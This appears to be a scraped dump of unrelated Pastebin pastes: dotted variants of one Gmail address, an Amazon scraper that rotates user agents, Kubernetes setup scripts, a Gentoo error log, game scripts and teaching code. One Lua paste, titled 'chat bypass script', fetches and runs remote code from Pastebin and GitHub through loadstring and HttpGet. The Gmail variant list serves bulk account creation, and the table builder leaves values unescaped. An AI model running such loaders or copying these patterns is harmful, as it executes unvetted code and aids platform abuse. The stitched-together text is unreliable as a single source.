<a href=""mailto:ya.s.s.in.ea.l.a.o.u.i27.0.7@gmail.com"">ya.s.s.in.ea.l.a.o.u.i27.0.7@gmail.com</a>
<a href=""mailto:yas.si.n.e.a.l.a.o.ui.270.7@gmail.com"">yas.si.n.e.a.l.a.o.ui.270.7@gmail.com</a>
<a href=""mailto:yass.in.e.a.l.a.oui2.707@gmail.com"">yass.in.e.a.l.a.oui2.707@gmail.com</a>
<a href=""mailto:yassine.alao.u.i270.7@gmail.com"">yassine.alao.u.i270.7@gmail.com</a>
<a href=""mailto:yas.si.n.e.ala.o.ui27.07@gmail.com"">yas.si.n.e.ala.o.ui27.07@gmail.com</a>
<a href=""mailto:y.assine.a.laou.i.27.07@gmail.com"">y.assine.a.laou.i.27.07@gmail.com</a>
<a href=""mailto:ya.s.si.nea.l.a.o.ui27.0.7@gmail.com"">ya.s.si.nea.l.a.o.ui27.0.7@gmail.com</a>
<a href=""mailto:yass.i.n.e.ala.ou.i.27.0.7@gmail.com"">yass.i.n.e.ala.ou.i.27.0.7@gmail.com</a>
<a href=""mailto:y.as.si.ne.a.laou.i.2.7.0.7@gmail.com"">y.as.si.ne.a.laou.i.2.7.0.7@gmail.com</a>
<a href=""mailto:ya.s.si.neala.ou.i.2.7.07@gmail.com"">ya.s.si.neala.ou.i.2.7.07@gmail.com</a>
<a href=""mailto:yass.i.n.ea.laou.i.270.7@gmail.com"">yass.i.n.ea.laou.i.270.7@gmail.com</a>
<a href=""mailto:y.a.ss.i.n.ea.l.aou.i.2.7.07@gmail.com"">y.a.ss.i.n.ea.l.aou.i.2.7.07@gmail.com</a>
<a href=""mailto:ya.ssineala.oui2.707@gmail.com"">ya.ssineala.oui2.707@gmail.com</a>
<a href=""mailto:y.a.s.s.i.ne.al.a.o.ui.2.7.07@gmail.com"">y.a.s.s.i.ne.al.a.o.ui.2.7.07@gmail.com</a>
<a href=""mailto:y.a.ss.in.ealao.u.i.2707@gmail.com"">y.a.ss.in.ealao.u.i.2707@gmail.com</a>
<a href=""mailto:y.a.ss.in.ea.l.ao.ui2.7.0.7@gmail.com"">y.a.ss.in.ea.l.ao.ui2.7.0.7@gmail.com</a>
<a href=""mailto:ya.ssinealaoui2.7.0.7@gmail.com"">ya.ssinealaoui2.7.0.7@gmail.com</a>
<a href=""mailto:y.a.ssine.alaoui2707@gmail.com"">y.a.ssine.alaoui2707@gmail.com</a>
<a href=""mailto:ya.s.s.i.n.e.alaou.i.2.707@gmail.com"">ya.s.s.i.n.e.alaou.i.2.707@gmail.com</a>
<a href=""mailto:yas.si.n.e.a.lao.ui.2.707@gmail.com"">yas.si.n.e.a.lao.ui.2.707@gmail.com</a>
<a href=""mailto:ya.s.sin.e.a.l.a.o.ui.27.07@gmail.com"">ya.s.sin.e.a.l.a.o.ui.27.07@gmail.com</a>
<a href=""mailto:y.assi.ne.a.l.a.o.u.i2707@gmail.com"">y.assi.ne.a.l.a.o.u.i2707@gmail.com</a>
<a href=""mailto:y.a.ss.i.n.ea.l.a.oui2.7.07@gmail.com"">y.a.ss.i.n.ea.l.a.oui2.7.07@gmail.com</a>
<a href=""mailto:ya.s.si.ne.ala.o.u.i.2.7.07@gmail.com"">ya.s.si.ne.ala.o.u.i.2.7.07@gmail.com</a>
<a href=""mailto:ya.ssi.ne.a.la.o.u.i2.7.0.7@gmail.com"">ya.ssi.ne.a.la.o.u.i2.7.0.7@gmail.com</a>
<a href=""mailto:yas.si.nea.l.a.o.ui.2.7.07@gmail.com"">yas.si.nea.l.a.o.ui.2.7.07@gmail.com</a>
<a href=""mailto:y.as.si.nea.l.aoui2.7.07@gmail.com"">y.as.si.nea.l.aoui2.7.07@gmail.com</a>
<a href=""mailto:y.a.s.s.ine.ala.o.u.i.27.07@gmail.com"">y.a.s.s.ine.ala.o.u.i.27.07@gmail.com</a>
<a href=""mailto:y.a.s.si.n.ea.l.a.oui.27.07@gmail.com"">y.a.s.si.n.ea.l.a.oui.27.07@gmail.com</a>
<a href=""mailto:yas.si.n.ea.l.a.oui.27.0.7@gmail.com"">yas.si.n.ea.l.a.oui.27.0.7@gmail.com</a>
<a href=""mailto:ya.s.si.n.eal.aoui2707@gmail.com"">ya.s.si.n.eal.aoui2707@gmail.com</a>
<a href=""mailto:yass.i.n.e.a.la.ou.i.2.7.0.7@gmail.com"">yass.i.n.e.a.la.ou.i.2.7.0.7@gmail.com</a>
<a href=""mailto:y.a.ssi.n.ealao.u.i.27.0.7@gmail.com"">y.a.ssi.n.ealao.u.i.27.0.7@gmail.com</a>
<a href=""mailto:yassi.n.eal.a.o.ui2.7.0.7@gmail.com"">yassi.n.eal.a.o.ui2.7.0.7@gmail.com</a>
<a href=""mailto:yassine.al.aoui.270.7@gmail.com"">yassine.al.aoui.270.7@gmail.com</a>
<a href=""mailto:yas.s.in.eal.a.o.u.i.27.07@gmail.com"">yas.s.in.eal.a.o.u.i.27.07@gmail.com</a>
<a href=""mailto:ya.s.si.nea.l.ao.u.i27.07@gmail.com"">ya.s.si.nea.l.ao.u.i27.07@gmail.com</a>"
h1wcJvSh,Untitled,veritas2022,JavaScript,Saturday 8th of July 2023 03:38:26 PM CDT,"
function jsonToHTML(params) {

let pasedJson = JSON.parse(params);
let columeName = Object.keys(pasedJson[0]);
let values = pasedJson.map(obj => Object.values(obj));

 let result = '<table>\n';

appendHeaders(columeName);
appendValues(values);

function appendHeaders(columeName) {
    result += '  <tr>'

    for(let column of columeName){
        result += `<th>${column}</th>`;
    }
    result += '</tr>\n'
   }
function appendValues(values) {
   
    for(let val of values){
        result +=`  <tr>`;
        for (const single of val) {
            result += `<td>${single}</td>`;
        }
        result +=`</tr>\n`;
}
}
result += '</table>\n';
console.log(result);
}

jsonToHTML(`
[{""Name"":""Stamat"",
""Score"":5.5},
{""Name"":""Rumen"",
""Score"":6}]`)


jsonToHTML(`[{""Name"":""Pesho"",""Score"":4,""Grade"":8},
{""Name"":""Gosho"",""Score"":5,""Grade"":8},
{""Name"":""Angel"",""Score"":5.50,""Grade"":10}]`);
"
JCgyjNen,Untitled,veritas2022,JavaScript,Saturday 8th of July 2023 03:37:38 PM CDT,"//Съдията ми дава само 50%
function jsonToHTML(params) {

let pasedJson = JSON.parse(params);
let columeName = Object.keys(pasedJson[0]);
let values = pasedJson.map(obj => Object.values(obj));

 let result = '<table>\n';

appendHeaders(columeName);
appendValues(values);

function appendHeaders(columeName) {
    result += '  <tr>'

    for(let column of columeName){
        result += `<th>${column}</th>`;
    }
    result += '</tr>\n'
   }
function appendValues(values) {
   
    for(let val of values){
        result +=`  <tr>`;
        for (const single of val) {
            result += `<td>${single}</td>`;
        }
        result +=`</tr>\n`;
}
}
result += '</table>\n';
console.log(result);
}

jsonToHTML(`
[{""Name"":""Stamat"",
""Score"":5.5},
{""Name"":""Rumen"",
""Score"":6}]`)


jsonToHTML(`[{""Name"":""Pesho"",""Score"":4,""Grade"":8},
{""Name"":""Gosho"",""Score"":5,""Grade"":8},
{""Name"":""Angel"",""Score"":5.50,""Grade"":10}]`);
"
1hYgXC7K,Untitled,Sushill,Python,Saturday 8th of July 2023 03:31:00 PM CDT,"import aiohttp
from tool import userAgents
import logging

import asyncio
from bs4 import BeautifulSoup

async def main():
    url = ""https://www.amazon.se/s?k=intel""
    headers = {
        ""User-Agent"": userAgents()
    }

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, proxies=proxy, headers=headers) as response:
                html = await response.text()

                if amazon.useProxy and not response.connection.proxy_manager:
                    logging.error(
                        build_log_message(
                            colored(""request gjordes utan proxy. Stänger ner...."", ""red"")
                        )
                    )
                    return None
                soup = BeautifulSoup(html, ""html.parser"")

                products = soup.select_one(""div[data-component-type='s-search-result']"")
                for product in products:
                    title = product.select_one(""a.a-link-normal.a-text-normal"").text
                    price = product.select_one(""span.a-price"").text

                    print(f""Title: {title}"")
                    print(f""Price: {price}"")
        except aiohttp.ClientError as e:
            logging.error(build_log_message(""Inget svar vid requests...""))
            return None

# Call the `main` function to run the code asynchronously
asyncio.run(main())
"
6CW6yLid,tool,Sushill,Python,Saturday 8th of July 2023 03:16:35 PM CDT,"import secrets


def random_values(d_lists):
    """"""
    Returns a random value from a list.

    Args
    """"""
    idx = secrets.randbelow(len(d_lists))
    return d_lists[idx]


def userAgents():
    """"""
    Returns a random user agent string from a file containing a list of user agents.

    Args:
        -None

    Returns:
        -A string representing a ranom user agent.
    """"""
    with open('user-agents.txt') as f:
        agents = f.read().split(""\n"")
        return random_values(agents)


"
ztgtT67Y,main,Sushill,Python,Saturday 8th of July 2023 03:15:25 PM CDT,"import aiohttp
from bs4 import BeautifulSoup
import asyncio
from tool import userAgents

async def main():
    url = ""https://www.amazon.se/s?k=intel""
    headers = {
        ""User-Agent"": userAgents()
    }

    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            html = await response.text()
            # return html

    soup = BeautifulSoup(html, ""html.parser"")
    # return soup.prettify()
    products = soup.select_one(""div[data-component-type='s-search-result']"")
    # return products
    for product in products:
        # title = product.find(""a"", _class=""a-link-normal a-text-normal"").text
        title = product.select_one(""a.a-link-normal.a-text-normal"").text
        # price = product.find(""span"", _class=""a-price"").text
        price = product.select_one(""span.a-price"").text

        print(f""Title: {title}"")
        print(f""Price: {price}"")


if __name__ == '__main__':
    print(asyncio.run(main()))"
MKAdi8Db,chat bypass script,A_GUES,Lua,Saturday 8th of July 2023 03:00:27 PM CDT,"loadstring(game:HttpGet(('https://pastebin.com/raw/0E7VtnV4'),true))()
loadstring(game:HttpGet(""https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt"", true))()"
1KryB0se,webinar-for-loops-2023-07-08,jspill,Python,Saturday 8th of July 2023 02:49:06 PM CDT,"# 2023 July 8
# WEBINAR: For Loops

# We use loops to repeat actions

# a WHILE loop... is an IF that repeats as long as the loop condition remains True

# FOR LOOPS are used for repeating actions for every element in a container (list, str, tuples, sets, dictionary, range objects)

# Basic syntax of a for loop
# for ___ in _someContainer_:

# list
# myList = [""Agent Scully"", ""Agent Mulder"", ""Walter Skinner"", ""CSM"", ""Mr. X""]
# for item in myList:
#     print(item)
#
# # tuples
# myTuple = (""Gilligan"", ""Castaway002"", ""red"", ""crew"")
# for item in myTuple:
#     print(item)
#
# # strings
# myString = ""It was the best of times.""
# for char in myString:
#     print(char)
#
# # dictionaries
# # { key: value, key:value}
# # myDict[key] # retrieve the value for that key
# # myDict[key] = value # assign value to key
# bestOfXF = {
#     ""1x00"": ""Pilot"",
#     ""2x10"": ""Red Museum"",
#     ""2x14"": ""Die Hand Die Verletzt"",
#     ""3x04"": ""Clyde Bruckman's Final Repose"",
#     ""3x12"": ""War of the Coprophages"",
#     ""3x20"": ""Jose Chung's From Outer Space"",
#     ""4x05"": ""The Field Where I Died"",
#     ""5x05"": ""The Post Modern Prometheus"",
#     ""5x17"": ""All Souls""
# }
# for key in bestOfXF:
#     # ""Check out Episode ___ or '___'""
#     print(f""Check out Episode {key} or '{bestOfXF[key]}'"")

# to just to do something X number of times... range objects
for num in range(7): # range(start, stop, step)... range(0, 7, 1) --> [0, 1, 2, 3, 4, 5, 6]
    print(num)

myList = [""Agent Scully"", ""Agent Mulder"", ""Walter Skinner"", ""CSM"", ""Mr. X""]
# if I need to know the index, then
# for item/value in myList:
for i in range(len(myList)):
    print(f""{i}: {myList[i]}"")

# could also use ENUMERATE
for i, item in enumerate(myList):
    print(""{} - {}"".format(i, item))



# STUDENT QUESTIONS
# making dictionaries from lists... well that depends on what's in the list or lists you're starting with...
# ... and what you want in the dictionary you're making

# 1:1 Correspondence between lists... entries in one are keys and entries in other are their values
myList = [""Agent Scully"", ""Agent Mulder"", ""Walter Skinner"", ""CSM"", ""Mr. X""]
pets = [""Queequeg"", ""goldfish"", ""dog"", ""the human race"", ""cat""]


petDict = {}
for i in range(len(myList)):
    # myDict[key] = value
    petDict[myList[i]] = pets[i]
print(petDict) # {'Agent Scully': 'Queequeg', 'Agent Mulder': 'goldfish', 'Walter Skinner': 'dog', 'CSM': 'the human race', 'Mr. X': 'cat'}


# Alternating key, value data from one list
anotherList = [""Agent Scully"", ""red "", "" Agent Mulder"", "" gray"", ""Walter Skinner "", ""  white"", ""CSM"", ""\nblue"", ""Mr. X"", ""purple""]
anotherDict = {}
for i in range(0, len(anotherList), 2): # use the step
    # myDict[key] = value
    anotherDict[anotherList[i].strip()] = anotherList[i+1].strip()
print(anotherDict) # {'Agent Scully': 'red', 'Agent Mulder': 'gray', 'Walter Skinner': 'white', 'CSM': 'blue', 'Mr. X': 'purple'}


# Alternating key, value data from one list with potential repeat keys
anotherList = [""Agent Scully"", ""red"", "" Agent Mulder"", ""gray"", ""Walter Skinner"", ""white"", ""CSM"", ""blue"", ""Mr. X"", ""purple"", ""CSM"", ""pink""]
checkDict = {} # we'll check to see if the key is already there
for i in range(0, len(anotherList), 2):
    if anotherList[i] in checkDict:
        # if it's there, add to it in some way...
        # value... ""item1; item2""
        checkDict[anotherList[i]] += ""; "" + anotherList[i+1]
    else:
        checkDict[anotherList[i]] = anotherList[i + 1] # add if it's not there
# print(checkDict) # {'Agent Scully': 'red', ' Agent Mulder': 'gray', 'Walter Skinner': 'white', 'CSM': 'blue; pink', 'Mr. X': 'purple'}



# Student question Lab 14.10
# one approach...

# TODO: Declare any necessary variables here.
filename = input()
lastNames = []
firstNames = []
mid1 = []
mid2 = []
finals = []

# TODO: Read a file name from the user and read the tsv file here.
import csv

with open(filename, ""r"") as f:
    contents = list(csv.reader(f, delimiter=""\t""))
# print(contents) # sometimes it helps to just print something and look at it
for line in contents:
    lastNames.append(line[0])
    firstNames.append(line[1])
    mid1.append(int(line[2]))
    mid2.append(int(line[3]))
    finals.append(int(line[4]))

# TODO: Compute student grades and exam averages, then output results to a text file here.
with open(""report.txt"", ""w"") as f:
    for i in range(len(lastNames)): # we're using corresponding indices again
        gradesList = [mid1[i], mid2[i], finals[i]]
        avg = sum(gradesList) / len(gradesList)
        if avg >= 90:
            ltr = ""A""
        elif avg >= 80:
            ltr = ""B""
        elif avg >= 70:
            ltr = ""C""
        elif avg >= 60:
            ltr = ""D""
        else:
            ltr = ""F""
        # that contents var based on the original file is still around! Let's use it...
        f.write(""\t"".join(contents[i]) + f""\t{ltr}\n"") # part of the loop
    # NOT part of the loop!
    f.write(f""\nAverages: midterm1 {sum(mid1) / len(mid1):.2f}, midterm2 {sum(mid2) / len(mid2):.2f}, final {sum(finals) / len(finals):.2f}\n"")


"
n0ySjPSZ,Untitled,belleti,YAML,Saturday 8th of July 2023 02:40:07 PM CDT,"
Vagrant.configure(""2"") do |config|
config.vm.define ""c1master"" do |c1master|
      c1master.vm.box = ""ubuntu/trusty64""
      c1master.vm.network ""private_network"", ip: ""172.16.94.10""
      c1master.vm.provision ""shell"", path:""./onall.sh""
      c1master.vm.provision ""shell"", path:""./master.sh""
end


config.vm.define ""c1-node1"" do |c1node1|
  c1node1.vm.box = ""ubuntu/trusty64""
  c1node1.vm.network ""private_network"", ip:  ""172.16.94.11""
  c1node1.vm.provision ""shell"", path:""./onall.sh""
  c1node1.vm.provision ""shell"", path:""./worker.sh""
end


config.vm.define ""c1-node2"" do |c1node2|
  c1node2.vm.box = ""ubuntu/trusty64""
  c1node2.vm.network ""private_network"", ip: ""172.16.94.12""
  c1node2.vm.provision ""shell"", path:""./onall.sh""
  c1node2.vm.provision ""shell"", path:""./worker.sh""
end

config.vm.provider ""virtualbox"" do |vb|
  vb.memory = ""3072""
  vb.cpus = ""2""

end


end


"
9HCVLeZ4,receive_data_reactor_CC,giwdul,Lua,Saturday 8th of July 2023 02:32:31 PM CDT,"-- Receive data from send_data_reactor_CC and display it on a monitor

local modem = peripheral.wrap(""left"")
local mon = peripheral.wrap(""back"")
local maxPower = 150000 -- Votre puissance maximale

local gaugeWidth = 3 -- Largeur de la jauge en blocs
local gaugeMargin = 1 -- Marge en haut et en bas de la jauge
local width, height = mon.getSize() -- Taille totale de l'écran

while true do
    rednet.open(""left"")
    local senderID, power, protocol = rednet.receive()
    rednet.close(""left"")
 
    -- Nettoie la zone de la jauge
    mon.setBackgroundColor(colors.gray)
    for i = 1, height do
        mon.setCursorPos((width - gaugeWidth) / 2 + 1, i)
        mon.write(string.rep("" "", gaugeWidth))
    end
 
    -- Calcul de la taille de la jauge
    local gaugeHeight = math.floor((power / maxPower) * (height - 2 * gaugeMargin))
 
    -- Affiche la jauge
    mon.setBackgroundColor(colors.green)
    for i = 1, gaugeHeight do
        mon.setCursorPos((width - gaugeWidth) / 2 + 1, height - gaugeMargin - i + 1)
        mon.write(string.rep("" "", gaugeWidth))
    end
 
    -- Affiche les valeurs
    mon.setCursorPos((width - string.len(""Max: "" .. maxPower)) / 2 + 1, gaugeMargin) -- Positionne le texte au-dessus de la jauge
    mon.setBackgroundColor(colors.black)
    mon.setTextColor(colors.white)
    mon.write(""Max: "" .. maxPower)
    mon.setCursorPos((width - string.len(""Current: "" .. power)) / 2 + 1, height - gaugeMargin + 1) -- Positionne le texte en dessous de la jauge
    mon.write(""Current: "" .. power)
end
"
J9YfwBRZ,send_data_reactor_CC,giwdul,Lua,Saturday 8th of July 2023 02:30:48 PM CDT,"-- Send data of Bigger Reactors to another Computer, here the producedLastTick() function

-- Assurez-vous que votre modem est sur le bon côté, ici ""front""
local modem = peripheral.wrap(""front"")
local reactor = peripheral.wrap(""back"")
local reactor = reactor.battery()
-- ID de l'ordinateur recevant les données
local receiverID = 6
-- La fréquence à laquelle envoyer des mises à jour (en secondes)
local updateFrequency = 1

while true do
    local production = reactor.producedLastTick()
    rednet.open(""front"")
    rednet.send(receiverID, production)
    rednet.close(""front"")
    sleep(updateFrequency)
end
"
YSDuRn2i,Программа для запросов,alien_555,Python,Saturday 8th of July 2023 02:30:27 PM CDT,"base = int(input(""base: ""))
operation = input(""operation: "")

# место для вашего кода
if operation == '+' or operation == '*':
  next = int(input(""next: ""))

  if operation == '+':
    base += next
  elif operation == '*':
    base *= next
  
  operation = input(""operation: "")
  if operation == '-' or operation == '/':
    next = int(input(""next: ""))
    
    if operation == '-':
      base -= next
      print(base)
    elif operation == '/':
      base /= next
      print(base)
    
  elif operation != '-' and operation != '/':
    print('error')
    
elif operation != '+' and operation != '*':
  print('error')"
W3NfM8TC,Untitled,belleti,YAML,Saturday 8th of July 2023 02:27:08 PM CDT,"initialize_master_node() {
    wget https://raw.githubusercontent.com/projectcalico/calico/master/manifests/calico.yaml
    sudo kubeadm init --kubernetes-version v1.26.0
    mkdir -p $HOME/.kube
    sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
    sudo chown $(id -u):$(id -g) $HOME/.kube/config

    ##For vagrant user
    mkdir -p /home/vagrant/.kube
    sudo cp -f /etc/kubernetes/admin.conf /home/vagrant/.kube/config
    sudo chown 900:900 /home/vagrant/.kube/config

    kubectl apply -f calico.yaml

}

create_join_command() {
    kubeadm token create --print-join-command | tee /vagrant/join_command.sh
    chmod +x /vagrant/join_command.sh
}



***************************
*****************************

#!/bin/bash -e

get_join_command ()
{
sudo /vagrant/join_command.sh
}

get_join_command













"
GwEdPDUR,Untitled,Realmagnum,Bash,Saturday 8th of July 2023 02:27:00 PM CDT,"sip ~ # emerge -av dev-python/setuptools_scm dev-python/setuptools

!!! Your current profile is deprecated and not supported anymore.
!!! Use eselect profile to update your profile.
!!! Please upgrade to the following profile if possible:

        default/linux/amd64/17.1

These are the packages that would be merged, in order:

Calculating dependencies... done!
[ebuild     U  ] dev-python/certifi-10001-r1::gentoo [10001::gentoo] USE=""-test"" PYTHON_TARGETS=""python3_9* (-pypy3) (-python3_10) -python3_8 (-python2_7%*) (-python3_6%) (-python3_7%*)"" 4 KiB
[ebuild     U  ] dev-python/setuptools-57.0.0::gentoo [46.4.0-r3::gentoo] USE=""-test"" PYTHON_TARGETS=""python3_9* (-pypy3) (-python3_10) -python3_8 (-python2_7%*) (-python3_6%) (-python3_7%*)"" 2,095 KiB
[ebuild  N     ] dev-python/toml-0.10.2::gentoo  USE=""-test"" PYTHON_TARGETS=""python3_9 (-pypy3) (-python3_10) -python3_8"" 23 KiB
[ebuild  N     ] dev-python/setuptools_scm-6.0.1-r1::gentoo  USE=""-test"" PYTHON_TARGETS=""python3_9 (-pypy3) (-python3_10) -python3_8"" 51 KiB

Total: 4 packages (2 upgrades, 2 new), Size of downloads: 2,172 KiB

!!! Multiple package instances within a single package slot have been pulled
!!! into the dependency graph, resulting in a slot conflict:

dev-python/setuptools:0

  (dev-python/setuptools-57.0.0:0/0::gentoo, ebuild scheduled for merge) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_9 (-pypy3) (-python3_10) -python3_8"" pulled in by
    dev-python/setuptools (Argument)
    >=dev-python/setuptools-42.0.2[python_targets_pypy3(-)?,python_targets_python3_8(-)?,python_targets_python3_9(-)?,python_targets_python3_10(-)?] required by (dev-python/toml-0.10.2:0/0::gentoo, ebuild scheduled for merge) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_9 (-pypy3) (-python3_10) -python3_8""
                                                                                                                                                                                                                                                                                                                                                                                                                                                            
    >=dev-python/setuptools-42.0.2[python_targets_pypy3(-)?,python_targets_python3_8(-)?,python_targets_python3_9(-)?,python_targets_python3_10(-)?] required by (dev-python/setuptools_scm-6.0.1-r1:0/0::gentoo, ebuild scheduled for merge) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_9 (-pypy3) (-python3_10) -python3_8""
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

  (dev-python/setuptools-46.4.0-r3:0/0::gentoo, installed) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python2_7 python3_7 (-pypy3) -python3_6 -python3_8 -python3_9"" pulled in by
    >=dev-python/setuptools-42.0.2[python_targets_python3_7(-),-python_single_target_pypy3(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (dev-python/setuptools-scm-4.1.2-r1:0/0::gentoo, installed) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 (-pypy3) -python3_6 -python3_8 -python3_9""

    >=dev-python/setuptools-42.0.2[python_targets_python3_7(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-)] required by (dev-util/meson-0.54.3:0/0::gentoo, installed) USE=""(-test)"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 -python3_6 -python3_8""
                                                                                                                                                                                                                                                                                                                                                                                                                                 
    >=dev-python/setuptools-42.0.2[python_targets_python3_7(-),-python_single_target_pypy3(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (app-portage/gemato-15.2:0/0::gentoo, installed) USE=""gpg -test -tools"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 (-pypy3) -python3_6 -python3_8 -python3_9""
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
    >=dev-python/setuptools-42.0.2[python_targets_python3_7(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (dev-python/django-3.0.10:0/0::gentoo, installed) USE=""sqlite -doc -test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 -python3_6 -python3_8 -python3_9""

    dev-python/setuptools[python_targets_python3_7(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (sys-apps/file-5.39-r3:0/0::gentoo, installed) USE=""bzip2 python seccomp static-libs zlib -lzma"" ABI_X86=""(64) -32 (-x32)"" PYTHON_TARGETS=""python3_7 -python3_6 -python3_8 -python3_9""

    >=dev-python/setuptools-42.0.2[python_targets_python3_7(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (dev-python/cffi-1.14.0-r3:0/1.14.0::gentoo, installed) USE=""-doc -test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 -python3_6 -python3_8 -python3_9""

    >=dev-python/setuptools-42.0.2[python_targets_python3_7(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (dev-util/scons-4.0.1:0/0::gentoo, installed) USE=""-doc -test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 -python3_6 -python3_8 -python3_9""
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       

dev-python/certifi:0

  (dev-python/certifi-10001-r1:0/0::gentoo, ebuild scheduled for merge) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_9 (-pypy3) (-python3_10) -python3_8"" pulled in by
    >=dev-python/certifi-2016.9.26[python_targets_pypy3(-)?,python_targets_python3_8(-)?,python_targets_python3_9(-)?,python_targets_python3_10(-)?] required by (dev-python/setuptools-57.0.0:0/0::gentoo, ebuild scheduled for merge) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_9 (-pypy3) (-python3_10) -python3_8""
                                                                                                                                                                                                                                                                                                                                                                                                                                                                  

  (dev-python/certifi-10001:0/0::gentoo, installed) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python2_7 python3_7 (-pypy3) -python3_6 -python3_8 -python3_9"" pulled in by
    >=dev-python/certifi-2017.4.17[python_targets_python3_7(-),-python_single_target_pypy3(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (dev-python/requests-2.24.0-r1:0/0::gentoo, installed) USE=""ssl -socks5 -test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 (-pypy3) -python3_6 -python3_8 -python3_9""

    dev-python/certifi[python_targets_python3_7(-),-python_single_target_pypy3(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (dev-python/urllib3-1.25.10-r1:0/0::gentoo, installed) USE=""-brotli -doc -test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python3_7 (-pypy3) -python3_6 -python3_8 -python3_9""

    >=dev-python/certifi-2016.9.26[python_targets_python2_7(-),python_targets_python3_7(-),-python_single_target_pypy3(-),-python_single_target_python2_7(-),-python_single_target_python3_6(-),-python_single_target_python3_7(-),-python_single_target_python3_8(-),-python_single_target_python3_9(-)] required by (dev-python/setuptools-46.4.0-r3:0/0::gentoo, installed) USE=""-test"" ABI_X86=""(64)"" PYTHON_TARGETS=""python2_7 python3_7 (-pypy3) -python3_6 -python3_8 -python3_9""



It may be possible to solve this problem by using package.mask to
prevent one of those packages from being selected. However, it is also
possible that conflicting dependencies exist such that they are
impossible to satisfy simultaneously.  If such a conflict exists in
the dependencies of two different packages, then those packages can
not be installed simultaneously. You may want to try a larger value of
the --backtrack option, such as --backtrack=30, in order to see if
that will solve this conflict automatically.

For more information, see MASKED PACKAGES section in the emerge man
page or refer to the Gentoo Handbook.

sip ~ # "
qqihXteu,Untitled,kirkarr,Lua,Saturday 8th of July 2023 02:19:42 PM CDT,"if pocket then
	pocket.equipBack()
else
    printError(""Only pocket programm"")
end"
2WMx70ix,1846E2 AC,pb_jiang,C++,Saturday 8th of July 2023 02:17:35 PM CDT,"#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using pii = pair<int, int>;
using pll = pair<ll, ll>;
using vl = vector<ll>;
using vi = vector<int>;
using ull = unsigned long long;
using ld = long double;

// constexpr ll p1 = (1ll << 50) - 51, p2 = (1ll << 50) - 117;
constexpr ll p1 = (1ll << 30) - 35, p2 = (1ll << 30) - 41;

ll fpow(ll b, ll p, ll m)
{
    ll ret = 1;
    ll cur = b;
    while (p) {
        if (p % 2)
            ret = ret * cur % m;
        cur = cur * cur % m;
        p /= 2;
    }
    return ret;
}

int main(int argc, char **argv)
{
    ll t, n;
    cin >> t;
    while (t--) {
        cin >> n;
        bool ok = false;
        for (ll p = 3; p <= 90 && !ok; ++p) {
            ll lb = powl(n, 1.0 / (p - 1));
            auto fmod = [p](ll k) {
                return pll{(fpow(k, p, p1) + p1 - 1) % p1 * fpow(k - 1, p1 - 2, p1) % p1,
                           (fpow(k, p, p2) + p2 - 1) % p2 * fpow(k - 1, p2 - 2, p2) % p2};
            };
            if (fmod(lb) == pll{n % p1, n % p2})
                ok = true;
            else
                dbg(lb, p, n, fmod(lb), n % p1, n % p2);
        }
        cout << (ok ? ""YES"" : ""NO"") << endl;
    }
    return 0;
};"
Hs63DPrd,/resetchanidle for deVilbaT v1.0,westor,mIRC,Saturday 8th of July 2023 02:02:55 PM CDT,"ON ^*:TEXT:*:#: {
  if ($hget(RESET_CHAN_IDLE,$chan)) { hdel RESET_CHAN_IDLE $chan | haltdef }
}

alias resetchanidle {
  ; /resetchanidle <#channel>

  var %t = $nick($1,0)

  if (!$1) || ($status !== connected) || ($me !ison $1) || (%t == 1) { return }

  :again

  var %nick = $nick($1,$rands(1,%t))

  if (%nick == $me) { goto again }

  hadd -m RESET_CHAN_IDLE $1 1

  .parseline -itqn : $+ $ial(%nick) PRIVMSG $1 :-RESETIDLE-
}"
iRk8dvR2,Untitled,Yuvraj9886,Python,Saturday 8th of July 2023 01:45:44 PM CDT,"import pandas as pd
import numpy as np
import seaborn as sns
from sklearn.model_selection import train_test_split
import matplotlib.pyplot as plt
from sklearn.impute import SimpleImputer
from sklearn.preprocessing import OneHotEncoder
from sklearn.preprocessing import OrdinalEncoder
from sklearn.compose import ColumnTransformer
